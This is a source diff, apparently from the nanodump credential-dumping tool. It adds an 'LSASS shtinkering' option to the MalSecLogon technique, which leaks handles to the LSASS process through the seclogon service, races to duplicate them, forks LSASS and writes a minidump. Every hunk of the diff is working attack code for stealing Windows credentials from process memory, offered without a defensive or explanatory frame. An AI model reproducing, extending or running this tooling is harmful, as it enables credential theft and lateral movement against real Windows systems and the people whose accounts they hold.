@@ -28,7 +28,8 @@ VOID set_command_line(
     IN LPCSTR dump_path,
     IN BOOL fork_lsass,
     IN BOOL snapshot_lsass,
-    IN BOOL use_valid_sig)
+    IN BOOL use_valid_sig,
+    IN BOOL use_lsass_shtinkering)
 {
     // program path
     wchar_t program_name_w[MAX_PATH];
@@ -39,10 +40,13 @@ VOID set_command_line(
     if (!use_malseclogon_locally)
         return;
     // dump path
-    wchar_t dump_path_w[MAX_PATH];
-    mbstowcs(dump_path_w, dump_path, MAX_PATH);
-    wcsncat(command_line, L" -w ", MAX_PATH);
-    wcsncat(command_line, dump_path_w, MAX_PATH);
+    if (dump_path)
+    {
+        wchar_t dump_path_w[MAX_PATH];
+        mbstowcs(dump_path_w, dump_path, MAX_PATH);
+        wcsncat(command_line, L" -w ", MAX_PATH);
+        wcsncat(command_line, dump_path_w, MAX_PATH);
+    }
     // --fork
     if (fork_lsass)
         wcsncat(command_line, L" -f", MAX_PATH);
@@ -52,6 +56,8 @@ VOID set_command_line(
     // --valid
     if (use_valid_sig)
         wcsncat(command_line, L" -v", MAX_PATH);
+    if (use_lsass_shtinkering)
+        wcsncat(command_line, L" -sk", MAX_PATH);
     // malseclogon
     wcsncat(command_line, L" -sll", MAX_PATH);
     // --stage 2
@@ -83,7 +89,8 @@ BOOL check_if_succeded(
     HANDLE hSpoofedProcess = get_process_handle(
         new_pid,
         SYNCHRONIZE,
-        FALSE);
+        FALSE,
+        0);
     if (!hSpoofedProcess)
         return FALSE;
 
@@ -127,6 +134,7 @@ BOOL malseclogon_handle_leak(
     IN BOOL fork_lsass,
     IN BOOL snapshot_lsass,
     IN BOOL use_valid_sig,
+    IN BOOL use_lsass_shtinkering,
     IN BOOL use_malseclogon_locally,
     IN DWORD lsass_pid,
     OUT PPROCESS_LIST* Pcreated_processes)
@@ -155,6 +163,7 @@ BOOL malseclogon_handle_leak(
         fork_lsass,
         snapshot_lsass,
         use_valid_sig,
+        use_lsass_shtinkering,
         use_malseclogon_locally,
         lsass_pid,
         created_processes);
@@ -163,6 +172,7 @@ BOOL malseclogon_handle_leak(
         PRINT_ERR("the --malseclogon-leak-local technique failed!");
         if (created_processes)
         {
+            kill_created_processes(created_processes);
             intFree(created_processes); created_processes = NULL;
             *Pcreated_processes = NULL;
         }
@@ -185,6 +195,7 @@ BOOL malseclogon_stage_1(
     IN BOOL fork_lsass,
     IN BOOL snapshot_lsass,
     IN BOOL use_valid_sig,
+    IN BOOL use_lsass_shtinkering,
     IN BOOL use_malseclogon_locally,
     IN DWORD lsass_pid,
     OUT PPROCESS_LIST process_list)
@@ -192,8 +203,9 @@ BOOL malseclogon_stage_1(
     BOOL success = FALSE;
     PHANDLE_LIST handle_list = NULL;
 
+
     // if the file already exists, delete it
-    if (file_exists(dump_path))
+    if (!use_lsass_shtinkering && file_exists(dump_path))
     {
         if (!delete_file(dump_path))
         {
@@ -209,7 +221,9 @@ BOOL malseclogon_stage_1(
         dump_path,
         fork_lsass,
         snapshot_lsass,
-        use_valid_sig);
+        use_valid_sig,
+        use_lsass_shtinkering);
+    DPRINT("command line: %ls", command_line);
 
     handle_list = find_process_handles_in_process(
         lsass_pid,
@@ -287,7 +301,7 @@ BOOL malseclogon_stage_1(
             return FALSE;
         }
         DPRINT(
-            "Created new process '%ls' (PID: %ld) with CreateProcessWithLogonW to leak process handles from lsass: 0x%lx 0x%lx 0x%lx",
+            "Created new process '%ls' (PID: %ld) with CreateProcessWithLogonW to leak process handles from " LSASS ": 0x%lx 0x%lx 0x%lx",
             filename,
             procInfo.dwProcessId,
             (DWORD)(ULONG_PTR)startInfo.hStdInput,
@@ -305,7 +319,7 @@ BOOL malseclogon_stage_1(
         }
 
         // if MalSecLogon was used against nanodump, check if the minidump was created
-        if (use_malseclogon_locally)
+        if (use_malseclogon_locally && !use_lsass_shtinkering)
         {
             success = check_if_succeded(
                 procInfo.dwProcessId,
@@ -329,7 +343,6 @@ BOOL malseclogon_stage_1(
     {
         // the new nanodump process was unable to create the minidump
         DPRINT_ERR("The created nanodump process did not create the dump");
-        DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
         return FALSE;
     }
     else
@@ -755,7 +768,8 @@ DWORD get_seclogon_pid(VOID)
 }
 
 HANDLE malseclogon_race_condition(
-    IN DWORD lsass_pid)
+    IN DWORD lsass_pid,
+    IN DWORD attributes)
 {
     BOOL success = FALSE;
     HANDLE hSeclogon = NULL;
@@ -807,7 +821,8 @@ HANDLE malseclogon_race_condition(
     hSeclogon = get_process_handle(
         seclogon_pid,
         PROCESS_DUP_HANDLE,
-        TRUE);
+        TRUE,
+        0);
     if (!hSeclogon)
     {
         PRINT_ERR("Could not open handle to seclogon");
@@ -837,7 +852,7 @@ HANDLE malseclogon_race_condition(
         // if not lsass, continue
         if (!is_lsass(hDupedHandle))
         {
-            DPRINT("The handle was not from" LSASS);
+            DPRINT("The handle was not from " LSASS);
             NtClose(hDupedHandle); hDupedHandle = NULL;
             continue;
         }
@@ -850,7 +865,8 @@ HANDLE malseclogon_race_condition(
          * we duplicated has PROCESS_CREATE_PROCESS
          */
         hProcess = fork_process(
-            hDupedHandle);
+            hDupedHandle,
+            attributes);
         if (hProcess)
         {
             // the handle is closed by fork_process
@@ -880,7 +896,7 @@ HANDLE malseclogon_stage_2(
     IN LPCSTR dump_path)
 {
     // if the file already exists, exit
-    if (file_exists(dump_path))
+    if (dump_path && file_exists(dump_path))
         return NULL;
 
     BOOL found_handle = FALSE;
